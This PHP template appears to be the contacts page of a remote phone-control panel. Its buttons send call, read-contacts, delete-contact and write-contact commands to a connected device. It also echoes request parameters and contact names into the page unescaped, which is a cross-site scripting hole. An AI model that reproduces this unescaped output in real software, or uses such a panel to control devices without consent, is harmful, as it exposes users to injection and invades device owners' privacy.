<?php require_once __DIR__ . "/../header.php"; ?>

<div class="container">
    <div class="row">
        <?php if (isset($_GET['alert'])): ?>
            <?php if ($_GET['alert'] == 1): ?>
                <div class="alert alert-success" id="error-alert" role="alert">
                    <strong> Request sent </strong>
                </div>
            <?php else: ?>
                <div class="alert alert-danger" id="error-alert" role="alert">
                    <strong> Request failed </strong>
                </div>
            <?php endif ?>
        <?php endif ?>
        <div class="col-md-12 page-header d-flex justify-content-between align-items-center">
            <h2 class="page-title"><?= $device ?> Contacts</h2>
            <button type="button" class="btn btn-dark" data-bs-toggle="modal" data-bs-target="#contactsModal"><i class="fas fa-plus"></i></button>
        </div>
    </div>
    <br>
    <div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="content">
                    <div class="canvas-wrapper">
                        <table class="table table-striped">
                            <thead class="success">
                                <tr>
                                    <th>Display Name</th>
                                    <th>Number</th>
                                </tr>
                            </thead>
                            <tbody class="files-class">
                                <?php if (count($contacts) > 0): ?>
                                    <?php foreach ($contacts as $contact): ?>
                                        <tr>
                                            <td><?= $contact->getName(); ?></td>
                                            <td><?= $contact->getNumber(); ?></td>
                                        </tr>
                                    <?php endforeach ?>
                                <?php else: ?>
                                    <tr class="text-center">
                                        No contacts
                                    </tr>
                                <?php endif ?>                
                            </tbody>
                        </table>
                    </div>
                </div>
                <?php require __DIR__ . "/../pagination.php"; ?>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="contactsModal" tabindex="-1" role="dialog" aria-labelledby="contactsModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="contacts-modal-title" id="contactsModalLabel">Contacts</h5>
          
        </div>
        <div class="modal-body">
          <form action="/send" method="post">
            <input type="hidden" name="web_socket_id" value="<?= $webSocketID ?>">
            <input type="hidden" name="cmd" value="CALL">
            <input type="hidden" name="type" value="server">
            <input type="hidden" name="referrer" value="contacts">
            <input type="hidden" name="client" value="<?= $_GET['client'] ?>">
            <div class="input-group mb-2">
                <input type="tel" class="form-control" name="number" placeholder="Number">
                <div class="input-group-append">
                    <button class="btn btn-primary" type="submit">Call</button>
                </div>
            </div>
          </form>

            <hr>

          <form action="/send" method="post">
            <input type="hidden" name="web_socket_id" value="<?= $webSocketID ?>">
            <input type="hidden" name="cmd" value="READ_CONTACTS">
            <input type="hidden" name="type" value="server">
            <input type="hidden" name="referrer" value="contacts">
            <input type="hidden" name="client" value="<?= $_GET['client'] ?>">
            <button type="submit" class="btn btn-primary">Read Contacts</button>
          </form>

          <hr>

          <form action="/send" method="post">
            <input type="hidden" name="web_socket_id" value="<?= $webSocketID ?>">
            <input type="hidden" name="cmd" value="DELETE_CONTACT">
            <input type="hidden" name="type" value="server">
            <input type="hidden" name="referrer" value="contacts">
            <input type="hidden" name="client" value="<?= $_GET['client'] ?>">
            <div class="form-group">
                <label for="recipient-name" class="col-form-label">Name:</label>
                <input name="name" type="text" class="form-control" id="recipient-name">
            </div>
            <div class="form-group">
                <label for="message-text" class="col-form-label">Number:</label>
                <input name="number" type="tel" class="form-control" id="recipient-name">
            </div>
            <br>
            <div class="form-group">
                <button type="submit" class="btn btn-primary">Delete Contact</button>
            </div>
          </form>

          <hr>

          <form action="/send" method="post">
            <input type="hidden" name="web_socket_id" value="<?= $webSocketID ?>">
            <input type="hidden" name="cmd" value="WRITE_CONTACT">
            <input type="hidden" name="type" value="server">
            <input type="hidden" name="referrer" value="contacts">
            <input type="hidden" name="client" value="<?= $_GET['client'] ?>">
            <div class="form-group">
                <label for="recipient-name" class="col-form-label">Name:</label>
                <input name="name" type="text" class="form-control" id="recipient-name">
            </div>
            <div class="form-group">
                <label for="message-text" class="col-form-label">Number:</label>
                <input name="number" type="tel" class="form-control" id="recipient-name">
            </div>
            <br>
            <div class="form-group">
                <button type="submit" class="btn btn-primary">Write Contact</button>
            </div>
          </form>
        </div>
      </div>
    </div>
</div>

<?php require_once __DIR__ . "/../footer.php"; ?>